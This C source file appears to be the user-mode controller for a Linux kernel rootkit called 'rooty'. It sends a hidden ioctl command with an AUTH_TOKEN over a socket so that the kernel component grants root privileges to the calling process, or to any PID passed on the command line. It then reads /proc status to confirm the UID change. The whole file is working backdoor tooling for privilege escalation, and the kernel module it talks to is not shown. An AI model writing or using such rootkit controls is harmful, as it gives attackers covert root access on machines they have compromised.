#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

#include "constants.h"

struct rooty_args
{
    unsigned short cmd;
    void *ptr;
};


void root_me(int sockfd){
    struct rooty_args rooty_args;
    int io;

    rooty_args.cmd = 0;
    uid_t curr_uid =  getuid();
    printf("curr_uid : %d\n", curr_uid);

    printf("sent root cmd\n");
    io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);

    curr_uid =  getuid();
    printf("curr_uid : %d\n", curr_uid);
}

int get_proc_uid(pid_t pid) {
    char path[MAX_BUF_SIZE];
    char pid_buffer [30];
    snprintf(pid_buffer, sizeof(pid_buffer), "%d", pid);

    snprintf(path, sizeof(path), "/proc/%s/status", pid_buffer);
    FILE *file = fopen(path, "r");
    if(file == NULL) {
        perror("Error opening file");
        return 1;
    }
    char line[MAX_BUF_SIZE];
    while(fgets(line, sizeof(line), file) != NULL) {
        if(strncmp(line, "Uid:", 4) == 0) {
            char *token = strtok(line, "\t ");
            // Skip the "Uid:" label
            token = strtok(NULL, "\t ");
            // Print the UID
            printf("pid: %s, curr_uid: %s\n", pid_buffer, token);
            return atoi(token);
        }
    }
    fclose(file);
    return 0;
}

void set_proc_root(int sockfd, pid_t pid){
    struct rooty_args rooty_args;
    int io;

    get_proc_uid(pid);

    rooty_args.cmd = 1;
    rooty_args.ptr = &pid;

    printf("sent root cmd\n");
    io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);

    get_proc_uid(pid);
}

int main ( int argc, char *argv[] )
{
    printf("[+] Start usermode dummy...\n\n");
    int sockfd;
    int io;
    sockfd = socket(AF_INET, SOCK_STREAM, 6);
    pid_t target_pid;
    if (argc > 1)
        target_pid = atoi(argv[1]);

    printf("[+] set current process with root privileges\n");
    root_me(sockfd);

    printf("[+] set PID: %d with root privileges\n", target_pid);
    set_proc_root(sockfd, target_pid);

    printf("\nbye..\n");
}
